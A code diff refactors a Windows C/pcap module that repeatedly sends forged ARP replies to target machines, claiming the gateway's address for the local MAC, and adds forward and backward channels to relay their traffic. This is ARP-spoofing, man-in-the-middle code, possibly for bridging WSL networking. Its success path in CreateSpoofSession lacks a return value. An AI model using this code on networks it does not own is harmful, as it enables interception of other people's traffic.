@@ -3,59 +3,68 @@
 #include "spoof.h"
 #include "packet.h"
 #include "globals.h"
+#include "channelling.h"
+#include "windows.h"
+#include "synchapi.h"
 
-#define MAX_THREADS MAX_MACHINES * 2
-
-static unsigned int threadsTop = 0;
-static HANDLE hThreads[MAX_THREADS];
-
-unsigned int spoofedTop = 0;
-MachineInfo spoofedMachines[MAX_MACHINES];
+int spoofSessionTop;
+SpoofSession spoofSessions[MAX_MACHINES];
 
 static ULONG SpoofThreadProc(LPVOID lpParams)
 {
-    MachineInfo *params = lpParams;
+    SpoofSession *session = lpParams;
     char errbuf[PCAP_BUF_SIZE];
     pcap_t *subDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
     pcap_t *wslDevice = pcap_open(VETHER_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
-    ArpPacket *arpPacket = malloc(sizeof(ArpPacket));
-    while (!exitFlag)
+    ArpPacket pktMem;
+    ArpPacket *arpPacket = &pktMem;
+    while (!session->exitFlag)
     {
-        SetupArpPacket(arpPacket, localMacAddr, params->MacAddress, gateAddr, params->IpAddress, 2);
+        SetupArpPacket(arpPacket, localMacAddr, session->machineInfo.MacAddress, gateAddr,
+                       session->machineInfo.IpAddress, 2);
         pcap_sendpacket(subDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
-        SetupArpPacket(arpPacket, wslHostAddr, wslAddr, params->IpAddress, ipWsl, 2);
-        pcap_sendpacket(wslDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
+        SetupArpPacket(arpPacket, wslHostAddr, wslAddr, session->machineInfo.IpAddress, ipWsl, 2);
+        // pcap_sendpacket(wslDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
     }
-    free(arpPacket);
     pcap_close(subDevice);
     pcap_close(wslDevice);
-    free(params);
 }
 
-void CreateSpoofThread(uint8_t *targetMac, uint32_t targetIp)
+SpoofSession *CreateSpoofSession(uint8_t *targetMac, uint32_t targetIp)
 {
-    if (spoofedTop >= MAX_MACHINES)
+    if (spoofSessionTop >= MAX_MACHINES)
     {
-        return;
+        return NULL;
     }
 
     DWORD threadId;
-    HANDLE handle;
-    MachineInfo *pParams = malloc(sizeof(MachineInfo));
-    memcpy(pParams->MacAddress, targetMac, 6);
-    pParams->IpAddress = targetIp;
-    if (handle = CreateThread(NULL, 0, SpoofThreadProc, pParams, 0, &threadId))
+    SpoofSession *session = &spoofSessions[spoofSessionTop];
+    memset(session, 0, sizeof(SpoofSession));
+    memcpy(session->machineInfo.MacAddress, targetMac, MACADDR_LEN);
+    session->machineInfo.IpAddress = targetIp;
+    if (!(session->hSpoofThread = CreateThread(NULL, 0, SpoofThreadProc, session, 0, &threadId)))
     {
-        LOG("Spoof thread on MAC %.2x%.2x%.2x%.2x%.2x%.2x started",
-            targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);
-        hThreads[threadsTop++] = handle;
-        memcpy(&spoofedMachines[spoofedTop].MacAddress, pParams->MacAddress, MACADDR_LEN);
-        spoofedMachines[spoofedTop].IpAddress = pParams->IpAddress;
-        spoofedTop++;
+        LOG("Spoof thread on MAC %.2x%.2x%.2x%.2x%.2x%.2x failed to start!",
+            targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5])
+        return NULL;
     }
+    LOG("Spoof thread on MAC %.2x%.2x%.2x%.2x%.2x%.2x started",
+        targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5])
+    //Create Channels
+    create_forward_channel(session);
+    create_backward_channel(session);
+    InitializeSRWLock(&session->rwLock);
+    run_forward_loop(session);
+    run_backward_loop(session);
 }
 
-void ShutdownSpoofThreads()
+void ShutdownSpoofSession(SpoofSession *session)
 {
-    WaitForMultipleObjects(threadsTop, hThreads, TRUE, -1);
+    session->exitFlag = true;
+    HANDLE arr[] = {session->hBackwardThread, session->hForwardThread, session->hSpoofThread};
+    WaitForMultipleObjects(3, arr, true, -1);
+    pcap_close(session->forwardChannel.vEtherDevice);
+    pcap_close(session->forwardChannel.wlanDevice);
+    pcap_close(session->backwardChannel.vEtherDevice);
+    pcap_close(session->backwardChannel.wlanDevice);
 }
